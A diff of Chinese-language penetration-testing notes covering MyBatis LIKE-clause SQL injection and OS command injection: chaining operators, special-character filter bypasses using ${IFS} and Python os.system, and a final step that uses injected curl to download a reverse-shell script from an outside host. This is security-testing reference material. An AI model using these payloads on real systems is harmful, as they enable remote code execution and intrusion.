@@ -532,6 +532,8 @@ public interface UserMapper {
             </select>
             ```
 
+            !!! warning "使用`SELECT * FROM user WHERE name LIKE concat ('%', {==(select 'xxx')==}, '%')`可以执行成功, 但如果使用的是`#{name}`仍然无法注入"
+
     ???+ danger
         需要对用户输入进行过滤, 防止在大数据量情况下输入`{==%%==}`导致{==DOS==}。
 
@@ -575,31 +577,42 @@ public interface UserMapper {
 
 ### 常见场景
 
+1. 测试网络连通性, 如: `ping -c 4 x.x.x.x`或`traceroute`
 1. 输入帐号 **口令** 测试SVN/git连通性
+1. 压缩解压
 1. **NTP** 服务器校时
 1. 上传解析 **文件名**
 1. **文件路径**
 
 ### 验证步骤
 
-1. 使用`;`, `|`或`&&`直接进行命令拼接
-1. 使用`\n`拼接
-1. 使用`` USERID=`id -u` ``或`USERID=$(uname -a)`进行命令替换
-1. 如果遇到特殊字符校验
+#### 基本模式
 
-    !!! tip "33种特殊字符`` `~!@#$%^&*()-_=+\|[{}];:'",<.>/?和空格 ``"
+1. 使用分隔符拼接`cmd1;cmd2`, 不论cmd1是否执行成功, cmd2都会执行
+1. 使用管道拼接`cmd1|cmd2`, 不论cmd1是否执行成功, cmd2都会执行
+1. 使用后台执行符拼接`cmd1&cmd2`, cmd1后台执行, cmd2不会等待cmd1执行完成
+1. 使用逻辑或操作符拼接`cmd1||cmd2`, 当cmd1执行失败时, 才会执行cmd2
+1. 使用逻辑与操作符拼接`cmd1&&cmd2`, 当cmd1执行成功时, 才会执行cmd2
+1. 使用命令替换`$(cmd)`, 将一个命令的执行结果赋值给另一个变量或作为另一个命令的参数, 如`USERID=$(uname -a)`或`echo $(whoami)`, cmd也可以是符号分割的多条语句
+1. 使用反引号进行命令替换, 如`` USERID=`id -u` ``, 等同于`$(cmd)`
+1. 使用重定向拼接`>(cmd)`或`<(cmd)`, 注意`>`和`(`之间不能有空格, cmd也可以是符号分割的多条语句
+1. 使用换行符拼接`cmd1\ncmd2`
 
-    1. `/`:
-        1. 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
-        1. 调用python库函数: `x;python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\";1.tar.gz`
-            1. 调用python命令行执行python脚本：`python -c "print('abc')"` 或 `python -c "print('ab""cd')"` 或 `python -c "print('ab"''"cd')"` 或 `python -c "print('ab"'xxx'"cd')"`
-            2. python脚本执行shell命令：`python -c "__import__('os').system('touch /tmp/hackfile')"` 或 `python -c "getattr(__import__('os'),'system')('touch /tmp/hackfile')"`
-            3. 替换空格：`python${IFS}-c${IFS}"getattr(__import__('os'),'system')('touch"'${IFS}'"/tmp/hackfile')"`
-            4. 替换斜杠：`python${IFS}-c${IFS}"getattr(__import__('os'),'system')('touch"'${IFS}'"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')"`
-            5. 在请求中将双引号反转义：`python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\"`
+#### 绕过特殊字符校验
 
-    1. 空格: 使用特殊变量替换: `$ a=$(curl$IFS"http://10.74.201.219:8888/")`
-    1. `;`: 使用十六进制替换: `a=$'\x3b'; echo $a`, 这种方式会被当做字符串来执行
+!!! tip "33种特殊字符`` `~!@#$%^&*()-_=+\|[{}];:'",<.>/?和空格 ``"
+
+1. `/`:
+    1. 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
+    1. 调用python库函数: `x;python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\";1.tar.gz`
+        1. 调用python命令行执行python脚本：`python -c "print('abc')"` 或 `python -c "print('ab""cd')"` 或 `python -c "print('ab"''"cd')"` 或 `python -c "print('ab"'xxx'"cd')"`
+        2. python脚本执行shell命令：`python -c "__import__('os').system('touch /tmp/hackfile')"` 或 `python -c "getattr(__import__('os'),'system')('touch /tmp/hackfile')"`
+        3. 替换空格：`python${IFS}-c${IFS}"getattr(__import__('os'),'system')('touch"'${IFS}'"/tmp/hackfile')"`
+        4. 替换斜杠：`python${IFS}-c${IFS}"getattr(__import__('os'),'system')('touch"'${IFS}'"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')"`
+        5. 在请求中将双引号反转义：`python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\"`
+
+1. 空格: 使用特殊变量替换: `$ a=$(curl$IFS"http://10.74.201.219:8888/")`
+1. `;`: 使用十六进制替换: `a=$'\x3b'; echo $a`, 这种方式会被当做字符串来执行
 
 1. 如果对特殊字符校验无法 {==反弹shell==}, 可分拆两步
     1. 上传反弹shell脚本, 保存到指定路径: `xxx$(curl$IFS-o"/tmp/hhack.pl"$IFS"http://x.x.x.x:8888/hhack.pl")`
